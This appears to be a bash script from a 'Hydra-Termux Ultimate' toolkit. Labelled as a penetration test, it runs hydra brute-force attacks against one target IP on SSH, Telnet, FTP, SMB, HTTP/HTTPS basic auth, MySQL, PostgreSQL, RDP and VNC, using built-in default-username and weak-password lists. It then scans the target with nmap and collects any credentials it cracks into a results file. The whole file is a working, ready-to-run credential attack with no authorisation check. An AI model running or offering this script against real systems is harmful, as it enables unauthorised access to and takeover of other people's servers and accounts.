#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# 🚀 SUPREME COMBO: COMPLETE NETWORK INFRASTRUCTURE
# Full network penetration test covering all major services
# SSH + FTP + Telnet + HTTP/HTTPS + MySQL + PostgreSQL + SMB + RDP
# ═══════════════════════════════════════════════════════════════════

# ════════════════════════════════════════════════════════════════
# ⚡ CONFIGURATION - Replace with actual target ⚡
# ════════════════════════════════════════════════════════════════
TARGET="10.0.0.1"    # Target IP or hostname - REPLACE WITH ACTUAL TARGET
# ════════════════════════════════════════════════════════════════

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/combo_supreme_network_${TARGET//[.:\/]/_}_${TIMESTAMP}.log"
RESULTS_FILE="$OUTPUT_DIR/combo_supreme_network_${TARGET//[.:\/]/_}_${TIMESTAMP}_results.txt"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  🚀 SUPREME COMBO: COMPLETE NETWORK INFRASTRUCTURE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Target:${NC}    ${BOLD}$TARGET${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Started:${NC}   $(date)" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

if [ ! -f "$USERLIST" ]; then
    cat > "$USERLIST" << EOF
admin
administrator
root
user
sysadmin
guest
test
EOF
fi

if [ ! -f "$PASSLIST" ]; then
    cat > "$PASSLIST" << EOF

password
123456
admin
Password123
admin123
root
letmein
welcome
changeme
P@ssw0rd
qwerty
12345678
EOF
fi

FOUND_CREDS=()
TOTAL_SERVICES=10

# ═══════════════════════════════════════════════════════════════════
# PHASE 1: REMOTE SHELL ACCESS
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 1: Remote Shell Access ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# SSH
echo -e "${BLUE}[1/10]${NC} Testing SSH (Port 22)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 32 -w 15 -f "ssh://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ SSH Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("SSH")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Telnet
echo -e "${BLUE}[2/10]${NC} Testing Telnet (Port 23)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 20 -f "telnet://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ Telnet Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("Telnet")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 2: FILE TRANSFER SERVICES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 2: File Transfer Services ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# FTP
echo -e "${BLUE}[3/10]${NC} Testing FTP (Port 21)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 48 -w 10 -f "ftp://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ FTP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("FTP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# SMB
echo -e "${BLUE}[4/10]${NC} Testing SMB (Port 445)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "smb://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ SMB Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("SMB")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 3: WEB SERVICES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 3: Web Services ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# HTTP
echo -e "${BLUE}[5/10]${NC} Testing HTTP Basic Auth (Port 80)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f "http-get://$TARGET/" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ HTTP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("HTTP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# HTTPS
echo -e "${BLUE}[6/10]${NC} Testing HTTPS Basic Auth (Port 443)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f "https-get://$TARGET/" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ HTTPS Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("HTTPS")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: DATABASE SERVICES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 4: Database Services ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# MySQL
echo -e "${BLUE}[7/10]${NC} Testing MySQL (Port 3306)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 24 -w 20 -f "mysql://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ MySQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("MySQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# PostgreSQL
echo -e "${BLUE}[8/10]${NC} Testing PostgreSQL (Port 5432)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 20 -w 25 -f "postgres://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ PostgreSQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("PostgreSQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 5: REMOTE DESKTOP
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 5: Remote Desktop ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# RDP
echo -e "${BLUE}[9/10]${NC} Testing RDP (Port 3389)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 45 -f "rdp://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ RDP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("RDP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# VNC
echo -e "${BLUE}[10/10]${NC} Testing VNC (Port 5900)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -P "$PASSLIST" -t 4 -w 30 -f "vnc://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "password:"; then
        echo -e "   ${GREEN}✓ VNC Password Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("VNC")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 6: COMPREHENSIVE PORT SCAN
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 6: Comprehensive Port Scan & Service Detection ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v nmap &>/dev/null; then
    echo -e "${BLUE}[SCAN]${NC} Performing comprehensive service scan..." | tee -a "$LOG_FILE"
    nmap -Pn -sV -sC -p 21,22,23,80,443,445,3306,3389,5432,5900,8080,8443 -T4 "$TARGET" 2>&1 | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  ✅ COMPLETE NETWORK INFRASTRUCTURE PENTEST FINISHED${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

SUCCESS_RATE=$((${#FOUND_CREDS[@]} * 100 / TOTAL_SERVICES))

if [ ${#FOUND_CREDS[@]} -gt 0 ]; then
    echo -e "${GREEN}🎉 CREDENTIALS DISCOVERED:${NC}" | tee -a "$RESULTS_FILE"
    for service in "${FOUND_CREDS[@]}"; do
        echo -e "   ${GREEN}✓${NC} $service" | tee -a "$RESULTS_FILE"
    done
    echo "" | tee -a "$RESULTS_FILE"
    
    # Extract all found credentials
    echo -e "${GREEN}📋 Detailed Credentials:${NC}" | tee -a "$RESULTS_FILE"
    grep -E "login:|password:|host:" "$LOG_FILE" | sort -u | tee -a "$RESULTS_FILE"
else
    echo -e "${YELLOW}ℹ No credentials found on any service.${NC}" | tee -a "$RESULTS_FILE"
fi

echo "" | tee -a "$LOG_FILE"
echo -e "${BLUE}📊 Attack Statistics:${NC}" | tee -a "$LOG_FILE"
echo -e "   Total Services Tested: $TOTAL_SERVICES" | tee -a "$LOG_FILE"
echo -e "   Successful Breaches: ${#FOUND_CREDS[@]}" | tee -a "$LOG_FILE"
echo -e "   Success Rate: ${SUCCESS_RATE}%" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}🎯 Services Breakdown:${NC}" | tee -a "$LOG_FILE"
echo -e "   Remote Shell: SSH, Telnet" | tee -a "$LOG_FILE"
echo -e "   File Transfer: FTP, SMB" | tee -a "$LOG_FILE"
echo -e "   Web Services: HTTP, HTTPS" | tee -a "$LOG_FILE"
echo -e "   Databases: MySQL, PostgreSQL" | tee -a "$LOG_FILE"
echo -e "   Remote Desktop: RDP, VNC" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}📁 Output Files:${NC}" | tee -a "$LOG_FILE"
echo -e "   Log: $LOG_FILE" | tee -a "$LOG_FILE"
echo -e "   Results: $RESULTS_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${PURPLE}⚡ NETWORK PENTEST POWERED BY HYDRA-TERMUX ULTIMATE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
